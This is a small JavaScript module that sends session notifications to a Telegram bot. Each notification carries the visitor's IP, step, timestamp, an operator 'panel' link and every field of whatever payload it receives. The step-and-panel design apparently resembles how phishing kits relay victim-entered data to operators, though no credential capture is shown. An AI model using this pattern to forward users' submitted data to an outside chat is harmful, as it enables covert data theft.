function getTelegramConfig() {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    return null;
  }

  return { botToken, chatId };
}

export async function notifyStepReached({ ip, step, timestamp, panelUrl, payload }) {
  const config = getTelegramConfig();
  if (!config) {
    return { sent: false, reason: "missing_config" };
  }

  const lines = [
    `Session: ${ip}`,
    `Step: ${step}`,
    `Timestamp: ${timestamp}`,
    `Panel: ${panelUrl}`
  ];

  if (payload && Object.keys(payload).length > 0) {
    for (const [key, value] of Object.entries(payload)) {
      lines.push(`${key}: ${value}`);
    }
  }

  const message = lines.join("\n");

  const response = await fetch(`https://api.telegram.org/bot${config.botToken}/sendMessage`, {
    method: "POST",
    headers: {
      "content-type": "application/json"
    },
    body: JSON.stringify({
      chat_id: config.chatId,
      text: message,
      disable_web_page_preview: true
    })
  });

  if (!response.ok) {
    const body = await response.text();
    throw new Error(`Telegram request failed: ${response.status} ${body}`);
  }

  return { sent: true };
}
